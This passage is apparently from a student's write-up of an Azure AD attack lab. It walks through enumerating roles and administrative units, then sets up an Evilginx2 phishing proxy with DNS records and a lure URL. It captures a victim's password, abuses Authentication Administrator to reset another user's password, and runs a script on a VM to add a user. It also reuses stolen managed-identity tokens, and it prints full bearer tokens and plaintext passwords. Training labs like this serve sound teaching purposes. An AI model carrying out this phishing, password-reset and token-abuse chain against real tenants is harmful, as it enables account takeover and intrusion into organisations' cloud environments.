RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Authorization/roleAssignments/09d7a314-1454-45bb-9576-9503d1f9c6b
                     9
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research
DisplayName        : Reader
SignInName         : reader@defcorphq.onmicrosoft.com
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 6952723d-91a8-4624-95a8-5409fd49c7fd
ObjectType         : User
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/providers/Microsoft.Authorization/roleAssignments/154d9d59-15ab-44d8-a212-c65b3377cf33
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768
DisplayName        : admin
SignInName         : admin@defcorphq.onmicrosoft.com
RoleDefinitionName : Key Vault Administrator
RoleDefinitionId   : 00482a5a-887f-4fb3-b363-3b7fe8e74483
ObjectId           : 4d67b155-3494-46d0-a4cf-de359d8a9d68
ObjectType         : User
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/providers/Microsoft.Authorization/roleAssignments/944407e4-0e5c-45fa-9a08-3a8e2a3cc2f8
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768
DisplayName        : admin
SignInName         : admin@defcorphq.onmicrosoft.com
RoleDefinitionName : Owner
RoleDefinitionId   : 8e3af657-a8ff-443c-a75c-2fe8c4bcb635
ObjectId           : 4d67b155-3494-46d0-a4cf-de359d8a9d68
ObjectType         : User
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/providers/Microsoft.Authorization/roleAssignments/6621aae2-3b5a-4c13-8f5d-5a86793c546c
Scope              : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768
DisplayName        : admin
SignInName         : admin@defcorphq.onmicrosoft.com
RoleDefinitionName : Contributor
RoleDefinitionId   : b24988ac-6180-42a0-ab88-20f7382dd24c
ObjectId           : 4d67b155-3494-46d0-a4cf-de359d8a9d68
ObjectType         : User
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :

```

- Note the Group `VM Admins` has the Role `Virtual Machine Command Executor` on `jumpvm`

<br/>

Check the role definition of `Virtual Machine Command Executor`:

```
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
```

![picture 97](images/94f0f3bdb8c179651619ae448f54961f22623c8319c5e00ce9006fc8e89426ed.png)  

- It has `runCommand` permission

<br/>

Then try to enumerate the members of the group `VM Admins`:

```
Get-AzADGroup -DisplayName 'VM Admins'; Get-AzADGroupMember -GroupDisplayName 'VM Admins' | Select UserPrincipalName
```

![picture 98](images/cbbc79809b965e208446e13a6189382e307a89705af04c5f5822fa881a1c4a36.png)  

- Group Display Name:  `VM Admins`
- Group ID: `783a312d-0de2-4490-92e4-539b0e4ee03e`
- Group member: `VMContributorxxxx@defcorphq.onmicrosoft.com`

<br/>

Get all the user details about the user `VMContributor190@defcorphq.onmicrosoft.com`:

```
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
```

```
$token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6IkJOWEo4d3FKSk16VVBDVngtVFBIZTEtMk9MdTdoeVFQTXItQ3JwWm9xM3MiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNjE5OTc4NTA5LCJuYmYiOjE2MTk5Nzg1MDksImV4cCI6MTYxOTk4MjQwOSwiYWNjdCI6MCwiYWNyIjoiMSIsImFjcnMiOlsidXJuOnVzZXI6cmVnaXN0ZXJzZWN1cml0eWluZm8iLCJ1cm46bWljcm9zb2Z0OnJlcTEiLCJ1cm46bWljcm9zb2Z0OnJlcTIiLCJ1cm46bWljcm9zb2Z0OnJlcTMiLCJjMSIsImMyIiwiYzMiLCJjNCIsImM1IiwiYzYiLCJjNyIsImM4IiwiYzkiLCJjMTAiLCJjMTEiLCJjMTIiLCJjMTMiLCJjMTQiLCJjMTUiLCJjMTYiLCJjMTciLCJjMTgiLCJjMTkiLCJjMjAiLCJjMjEiLCJjMjIiLCJjMjMiLCJjMjQiLCJjMjUiXSwiYWlvIjoiRTJaZ1lQQ2Jkck4xZnozLy9DZ3BWMjByeHBjR1Vncjl2VDlhazAvNWxjbWZhcitvWlFJQSIsImFtciI6WyJwd2QiXSwiYXBwX2Rpc3BsYXluYW1lIjoiTWljcm9zb2Z0IEF6dXJlIFBvd2VyU2hlbGwiLCJhcHBpZCI6IjE5NTBhMjU4LTIyN2ItNGUzMS1hOWNmLTcxNzQ5NTk0NWZjMiIsImFwcGlkYWNyIjoiMCIsImlkdHlwIjoidXNlciIsImlwYWRkciI6IjEwMS4wLjY1LjEzNCIsIm5hbWUiOiJLYXRoeSBOLiBTY2hhZWZlciIsIm9pZCI6ImZkNTExMDNiLTc0YzEtNDQ3NC04NzNhLTlkOGE2NjY1MzU3ZSIsInBsYXRmIjoiMyIsInB1aWQiOiIxMDAzMjAwMTIxOUZEODkzIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRsaWlVQmw3SWpGT3FjOXhkSldVWDhKd0FONC4iLCJzY3AiOiJ1c2VyX2ltcGVyc29uYXRpb24gcHJvZmlsZSBvcGVuaWQgZW1haWwiLCJzaWduaW5fc3RhdGUiOlsiaW5rbm93bm50d2siXSwic3ViIjoiZjM2VVdWZjFfOVZxWnNLNDZ0aHFWcGd4amNaUWJXY2hEV2VxbVloekJCSSIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoia2F0aHluc2NoYWVmZXJAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImthdGh5bnNjaGFlZmVyQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiItUWhMMW1aamNrR1ZMMUFKUkhXRUFnIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX2NjIjpbIkNQMSJdLCJ4bXNfc3QiOnsic3ViIjoiTE4wOVdGWXlUSXk2ME1mUGluZHBLMGtmZG1zd0pGRTdZSFQyNEZsMjFXRSJ9LCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.HlYYEraXZHmHSvMDpqRNYFKNkwZcy5BMGNJI5ciC1aeH980vwqIDO8A6uO9WiMAbWlt1P3oXpQqol64KgUQIf5zJm5bo9EghqvJlwuSuND6whyN59a4B-rLsgGs3cysv6rwHkCgQmdWbGSJwVDKWZTDAxaudidZoK7tTdjiKHI8IDe45im2ASwUxsGKOmdNQ0qLsGnTAZqa_Ydq76uTH5Nb9Nchura3mNxhdjD6ttfTLFKgVgeAmKL-BambIvzh4sn8A3w-zbg_XLeLo5aIMeFrWDPG1e4WenbCXtpUOAFYa4g7Xq31MWcaA-Zh6NHTZ50gv18o9Cw1h3zzmgvDKyw'
$uri = 'https://graph.microsoft.com/v1.0/users/VMContributor190@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
  Method = 'GET'
  Uri = $uri
  Headers = @{
    'Authorization' = "Bearer $token"
  }
}
(Invoke-RestMethod @RequestParams).value
```

- Response:

```
@odata.type                   : #microsoft.graph.group
id                            : 477db607-3447-4fde-b7de-cdbef47321ed
deletedDateTime               :
classification                :
createdDateTime               : 2021-03-10T13:30:39Z
creationOptions               : {Team, ExchangeProvisioningFlags:3552}
description                   :
displayName                   : Defense Corporation
expirationDateTime            :
groupTypes                    : {Unified}
isAssignableToRole            :
mail                          : DefenseCorporation@defcorphq.onmicrosoft.com
mailEnabled                   : True
mailNickname                  : DefenseCorporation
membershipRule                :
membershipRuleProcessingState :
onPremisesDomainName          :
onPremisesLastSyncDateTime    :
onPremisesNetBiosName         :
onPremisesSamAccountName      :
onPremisesSecurityIdentifier  :
onPremisesSyncEnabled         :
preferredDataLocation         :
preferredLanguage             :
proxyAddresses                : {SMTP:DefenseCorporation@defcorphq.onmicrosoft.com}
renewedDateTime               : 2021-03-10T13:30:39Z
resourceBehaviorOptions       : {HideGroupInOutlook, SubscribeMembersToCalendarEventsDisabled, WelcomeEmailDisabled}
resourceProvisioningOptions   : {Team}
securityEnabled               : False
securityIdentifier            : S-1-12-1-1199420935-1339962439-3201162935-3978392564
theme                         :
visibility                    : Public
onPremisesProvisioningErrors  : {}

@odata.type                   : #microsoft.graph.administrativeUnit
id                            : e1e26d93-163e-42a2-a46e-1b7d52626395
deletedDateTime               :
displayName                   : Control Group
description                   : To Limit the privileges.
membershipRule                :
membershipType                :
membershipRuleProcessingState :
visibility                    :

@odata.type                   : #microsoft.graph.group
id                            : 783a312d-0de2-4490-92e4-539b0e4ee03e
deletedDateTime               :
classification                :
createdDateTime               : 2021-03-16T13:45:51Z
creationOptions               : {}
description                   : Members of this groups can execute commands on the VM
displayName                   : VM Admins
expirationDateTime            :
groupTypes                    : {}
isAssignableToRole            :
mail                          :
mailEnabled                   : False
mailNickname                  : 801e8ff2-0
membershipRule                :
membershipRuleProcessingState :
onPremisesDomainName          :
onPremisesLastSyncDateTime    :
onPremisesNetBiosName         :
onPremisesSamAccountName      :
onPremisesSecurityIdentifier  :
onPremisesSyncEnabled         :
preferredDataLocation         :
preferredLanguage             :
proxyAddresses                : {}
renewedDateTime               : 2021-03-16T13:45:51Z
resourceBehaviorOptions       : {}
resourceProvisioningOptions   : {}
securityEnabled               : True
securityIdentifier            : S-1-12-1-2017079597-1150291426-2605966482-1054887438
theme                         :
visibility                    :
onPremisesProvisioningErrors  : {}
```

- VMContributor190 is a member of the administrative unit `Control Group` (ID `e1e26d93-163e-42a2-a46e-1b7d52626395`)

<br/>

To enumerate more information about `Control Group`, as `Kathy`:

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; Connect-AzureAD -Credential $cred
```

<br/>

Information about the Administrative Unit `Control Group` (need its `Id`):

```
Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
```

![picture 99](images/0b26950a2665ef5d411f806632130b194d5dfa7f69b8d2263210ce33a090602e.png)  

<br/>

To get the members in `Control Group`:

```
Get-AzureADMSAdministrativeUnitMember -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
```

![picture 100](images/9ab2aafe5cb1891fd53a5bb88473f4cb8cee8ff7d41cf1092cb7b6b1d20b0a53.png)  

- The group `VM Admins` is a member of `Control Group`

<br/>

Further check for any roles scoped to the administrative unit `Control Group`:

```
Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
```

![picture 101](images/1986ddcbfb7b708c7c05864526aff2a3da741febdba13fd3fde474caf3d39363.png)  

- The user `Roy G. Cain` (Id: `8c088359-66fb-4253-ad0d-a91b82fd548a`) is in the `Control Group`
- Role Id: `5b3935ed-b52d-4080-8b05-3a1832194d3a`

<br/>

Further check the role ID:

```
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
```

![picture 102](images/5780562dc8ad2386f3ca935140687bbcef2a9f105ecaa834e80369d9d044017b.png)  

- In summary, we now understand the user `Roy` has `Authentication Administrator` privilege scoped to the administrative unit `Control Group`.

<br/>

Get user detail about Roy:

```
Get-AzureADUser -ObjectId 8c088359-66fb-4253-ad0d-a91b82fd548a
```

![picture 103](images/87fa00a0c8d0c32846b38366e488a89ebe3211011fa8924e92bcce57ae676b75.png)  

- UserPrincipalName:  `roygcain@defcorphq.onmicrosoft.com`

<br/>

---

## Objective 17: Phishing using Evilginx2

**Questions**

1. Using the information collected from the IAM of 'jumpvm' about others users, execute a phishing attack against the user that has Authentication Administrator role.

2. Use the Authentication Administrator privileges to reset password of a user who is a member of a group that has command execution privileges on the jumpvm.

3. Get command execution on the `jumpvm`

<br/>

**Answer**

In **Objective 17**, we know that `roygcain@defcorphq.onmicrosoft.com` has **Authentication Administrator** role scopes to the admin unit called `Control Group`, who can reset the password of all **VMContributor** (who are members of `VM Admins` group allowing them to have command execution on the `jumpvm`).

Given that, we will attempt to phish `roygcain@defcorphq.onmicrosoft.com`.

<br/>

### Setting up Evilginx2

```
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
```

![picture 104](images/ba9aa7011cb4236ca4653d9711a8df213d3f44d536de07cc07bb63e1ecfd68bb.png)  

<br/>

Configure server domain and IP. Then point it to a URL on the DNS you created above:

```
config domain student190.corp

config ip 172.16.152.190

phishlets hostname o365 login.student190.corp

phishlets get-hosts o365
```

![picture 105](images/3bbc17723e2c51018a64c38204b91fa6561cd7fafaa5868371b90940fe5635e2.png)  

<br/>

### Setup DNS

As a part of the attacker infrastructure, we have a Technitium DNS server. Access `http://172.16.2.50:5380` (admin / admin@123).

![picture 107](images/35142d729a5f87a7ca314ac23eece67b69276bef935a8670227f6c1dec3efe8f.png)  


<br/>

Navigate to **Zones > Add Zone**

- **Zone**: `student190.corp`
- **Type**: `Primary Zone (default) value

Then edit the `NS` record to point it the the DNS server IP:

![picture 108](images/54ddbfd49c794267be78859875ddb14555a80cd6f9c36b407b85039f861c3ed5.png)  

<br/>

Also edit the SOA record to point the Primary Name Server value to `172.16.2.50`:

![picture 109](images/a753264d650914f565301ee9d2a90128e6fdbe64f463b105fdd1996ecd061de1.png)  

<br/>

Then add an A record in the zone `student190.corp`:

- **Name:** login.login
- **Type:** A
- **TTL:** 180
- **IPv4 Address:** `172.16.152.190`

![picture 110](images/e115ed207b692bf3426e98d4f80f883d7de2b1d84286950b0c3857fbf1ba6fba.png)  

<br/>

Also add one more A record for `www.login`:

- **Name:** www.login
- **Type:** A
- **TTL:** 180
- **IPv4 Address:** `172.16.152.190`

![picture 111](images/e544ad6f8f4b02aa1388609e698e0bdc2870b7c1569ed8a8dc6252525e96d5ca.png)  


<br/>

On the local machine, setup the certificate path:

```
Copy-Item C:\Users\studentuser190\.evilginx\crt\ca.crt C:\Users\studentuser190\.evilginx\crt\login.student190.corp\o365.crt; Copy-Item C:\Users\studentuser190\.evilginx\crt\private.key C:\Users\studentuser190\.evilginx\crt\login.student190.corp\o365.key; dir C:\Users\studentuser190\.evilginx\crt\login.student190.corp\
```

![picture 112](images/a73757d3d2151e7e22314ec1b205f0fc1b249a4565c9f3d701adac987e0d90d6.png)  


<br/>

After setting up the DNS server, enable the phishlets:

```
phishlets enable o365
```

![picture 113](images/7b04202b485a10ca898412258f4b8c6d52c34b05cdd1961e85c498574de1c99d.png)  

<br/>

Enable the lures and get the phishing URL:

```
lures create o365
lures get-url 0
```

![picture 114](images/e4f35ffdcd5241ce9104128ad786e6418bdcedbf5aa24e402d268db024f5199a.png)  

- Phishing URL:  `https://login.login.student190.corp/sUEhTFrQ`

<br/>

### Send the lure

Send the phishing link via email to `roygcain@defcorphq.onmicrosoft.com`.

![picture 115](images/c19648e121cd6492df4ff3cf7f3203f40c5e725462dd2bcb5f3e893fa33901a6.png)  

<br/>

After a while, the victim gets phished and we get the following credentials:

- `roygcain@defcorphq.onmicrosoft.com` / `$3cur3c@!nMoka7985@123`

![picture 116](images/d578a9dafbcbe076bf7388bb3130d205543f631420fad491df284bb8ef040977.png)  

<br/>

Now, connect to AzureAD using credentials of the user Roy. Run the below command in a new PowerShell session:

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; $passwd = ConvertTo-SecureString '$3cur3c@!nMoka7985@123' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', $passwd); Connect-AzureAD -Credential $creds
```

![picture 117](images/90704e9917ebde7f564f4c0b815794efffc447607d45540618b0d15cebaf99d9.png)  

<br/>

As stated in the beginning, lets reset the password of `VMContributor190@defcorphq.onmicrosoft.com`:

```
$pass = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText -Force; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributor190@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $pass -Verbose
```

![picture 118](images/b5d5a6be189ce1a2b7e2ea06b7198cc805209a00f16f4c0ab11b853d105d548e.png)  


<br/>

Then disconnect and connect again as `VMContributor190@defcorphq.onmicrosoft.com`:

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; $pass = ConvertTo-SecureString 'VM@Contributor@123@321' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('VMContributor190@defcorphq.onmicrosoft.com', $pass); Connect-AzAccount -Credential $creds
```

![picture 119](images/ab252d5c3a4aa448a143147f41fc16a59ed14d82b66d815fb889230b3345b48a.png)  

<br/>

Gather information about `jumpvm` like public IP, OS version, etc.

```
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *
```

![picture 120](images/b99a75b98107b8edf752fe36c1750f68144c904028a72fcafd448ca30609ab58.png)  

```
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | Select -ExpandProperty NetworkProfile
```

![picture 121](images/f4bb2f4b4484536acccaba979514caeca58dd6ce417158fa951664527a086009.png)  


```
Get-AzNetworkInterface -Name jumpvm741
```

![picture 123](images/9021ace40cec9d069ab7a3538c3f8f5d39d6d499e2773d3b8a8b296d0be2b2e8.png)  

```
Get-AzPublicIpAddress -Name jumpvm-ip
```

![picture 124](images/490e8a722cfa904efb3e9cdde19533a7e4c975e1ea890b2e140b7e477e65240a.png)  

<br/>

However nothing in the above command. Instead login to Azure Portal to view the VM:

![picture 122](images/34f015f9145c7928bc332f509567b40ec26e932635961397703b10ff56dc45e6.png)  

- Network interface: `jumpvm741`
- Public IP: `51.116.180.87` / `10.0.1.4`

<br/>

Use Azure Powershell to execute VM Command:

```
Invoke-AzVMRunCommand -ScriptPath C:\AzAD\Tools\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName 'Research' -Verbose
```

![picture 125](images/9741b13d4e0f685bc1a9b85a1b9f87986c84a8b24fff58aa54d09be0a4341965.png)  

<br/>

Try to connect to `jumpVM` using the added credential:

```
$pass = ConvertTo-SecureString 'StudPassword@123' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('student190', $pass); $jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds
```

![picture 126](images/99ddcd99041558c594d2f1c56cb7e9e95cee6914fce9dee1bdba695d462f49bc.png)  

<br/>

---

## Objective 18: Enterprise Applications & ARM templates

**Questions**

1. Abuse the Managed Identity of the 'processfile' function app to compromise an Enterprise Application.
2. Enumerate the permissions that the Enterprise Application has in defcorphq tenant and abuse the permissions to extract secrets from a key vault.
3. Using the secrets from the key vault, extract credentials of a user from deployment history of one of the resource groups.

<br/>

**Answer**

Revisting Objective 12, we abused the webapp **virusscanner** to get the managed identity of the app, which enables us to add secrets to the enterprise application **webapp**.

![picture 128](images/165884d3ec04ad1e6c5a3b4c7a4bd0141785353b2c771fd40816cf88aa68ac2a.png)  

```
Status: [+] Management API
Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MjAzNzgzMTQsIm5iZiI6MTYyMDM3ODMxNCwiZXhwIjoxNjIwNDY1MDE0LCJhaW8iOiJFMlpnWVBocXBIa3l1c0Q4dlV2RmdwOEZzejN6QUE9PSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiX29udnVsSHpVMHU2bXJSa1g2c19BdyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9JVC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9wcm9jZXNzZmlsZSIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.GUNNWYtSc4vsXoAFAmsKWag4oPPlqsbMgiZ7GcL1WW_gFm_nstZZR4DWZQ_Rbja-6y_cSQmA6BMcyCgsFMqoive1Hox4aHUxxSh8ZSwvkPALjePnX48pPTnYz74P-ycaTrdTVpK7lBTehWl4K8jh_IKMaiF-DAy07rnN4gGGQTYQtexx6FulEY7U-hm6VISjUHM0iJLoHCcf_bTp3MZE7y-L5b9Y6Kx_U1w3PtsCiDMGJnBzOb9RtFXZUKCp5Cklp9lKXqQOL2DsmatdHxLuepcA8I_vXcZ2f_x38-e77b1Myq9dZN9MbNZsZqDns5A0TcmDS_2tbUSc9_Jj7GLBCQ
ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2

[+] Graph API
eyJ0eXAiOiJKV1QiLCJub25jZSI6IkgtVjRmYnAyS2FyMmo2ZnNKb0hKcUJIX3B6TzE4LUhZZlp1OWRqMlV5VmMiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYyMDM3ODMxNCwibmJmIjoxNjIwMzc4MzE0LCJleHAiOjE2MjA0NjUwMTQsImFpbyI6IkUyWmdZT0J3VHRXWS9OSTJ0OEMwVVdhNlJYYzhBQT09IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiOFJ1b281N3pORVNXb2FzdzJRXy1BdyIsInZlciI6IjEuMCIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.KKry996hNck9pEBr8zgkSKBmDBAu7bR2Arvjkx7k-kJdcHwn5TdJwnfhn2u7ZnY1DGLkP0XP5uCYLxEhaGdQXoT_9t6ngs1pVmnmyozJnuaAs2ia2lmzx8a_BIw5phEEZedERi_Ux7YO0peQmstt_S525B1kIkkpCQcQ9Y-UNFueMEBy4bj5pQRgplXHwj7Iy7tRcy4gA-pbiTEFYRCadQ-bYdluDUOBrkXG3Y12ZEokc3wZY5P1QoeHxuGGBlhfAW2v93hCfO-bKyNshz2zZ2Z3soa1DL5P37S10XhdJLOQbpRQFLzJ7FbAeL0QRRIXMOS3E5DOjhZJvs9bVlBo2A
ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2
```

- Client ID: `62e44426-5c46-4e3c-8a89-f461d5d586f2`

<br/>

Note:
Managed Identities are special service principals - we can enumerate the service principals in Azure AD and check the service principal that the AppId (Client ID) belongs to.

<br/>

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds
```

![picture 129](images/c13ec879f44fc4118ec8b3fdc65bd218b624602da3cf561e1b724f8169c4a872.png)  

<br/>

Enumerate the service principals:

```
Get-AzureADServicePrincipal -All $true | ? { $_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2" } | fl
```

![picture 131](images/c057323e3222d12fde4791797396d3dd5251a5077bcec94a8adb7ec2919b539b.png)  

```
DeletionTimestamp                  :
ObjectId                           : ea4c3c17-8a5d-4e1f-9577-b29dfff0730c
ObjectType                         : ServicePrincipal
AccountEnabled                     : true
AddIns                             : {}
AlternativeNames                   : {isExplicit=False, /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourcegroups/IT/providers/Microsoft.Web/sites/processfile}
AppDisplayName                     :
AppId                              : 62e44426-5c46-4e3c-8a89-f461d5d586f2
AppOwnerTenantId                   :
AppRoleAssignmentRequired          : False
AppRoles                           : {}
DisplayName                        : processfile
ErrorUrl                           :
Homepage                           :
KeyCredentials                     : {class KeyCredential {
                                       CustomKeyIdentifier: System.Byte[]
                                       EndDate: 7/29/2021 11:26:00 AM
                                       KeyId: 2ebfbea7-50c6-4652-84c4-c8ca8f8022b3
                                       StartDate: 4/30/2021 11:26:00 AM
                                       Type: AsymmetricX509Cert
                                       Usage: Verify
                                       Value:
                                     }
                                     , class KeyCredential {
                                       CustomKeyIdentifier: System.Byte[]
                                       EndDate: 6/13/2021 6:00:00 AM
                                       KeyId: dde9d159-5300-4e98-9731-48415f8dd35b
                                       StartDate: 3/15/2021 6:00:00 AM
                                       Type: AsymmetricX509Cert
                                       Usage: Verify
                                       Value:
                                     }
                                     }
LogoutUrl                          :
Oauth2Permissions                  : {}
PasswordCredentials                : {}
PreferredTokenSigningKeyThumbprint :
PublisherName                      :
ReplyUrls                          : {}
SamlMetadataUrl                    :
ServicePrincipalNames              : {62e44426-5c46-4e3c-8a89-f461d5d586f2, https://identity.azure.net/RnBfBe0fiFX1swjex+mQoxr7L9HC4RfALBgBrFh6e3E=}
ServicePrincipalType               : ManagedIdentity
Tags                               : {}
```

- ObjectId:  `ea4c3c17-8a5d-4e1f-9577-b29dfff0730c`
- Object Path: `/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourcegroups/IT/providers/Microsoft.Web/sites/processfile`
- AppId: `62e44426-5c46-4e3c-8a89-f461d5d586f2`
- DisplayName: `processfile`
- ServicePrincipalType: `ManagedIdentity`

That is to say, the token we got from exploiting the virusscan webapp is the managed identity of the function app **processfile**.

<br/>

Note:
**Note that this will not impact further attacks.** We looked at it just to understand that function apps may be in use behind app services. In fact, that is the most common use case of function aps. In this case, the processfile function app is processing the fileuploads to the virusscanner app service.

<br/>

Once again connect to Azure using the stolen tokens:

```
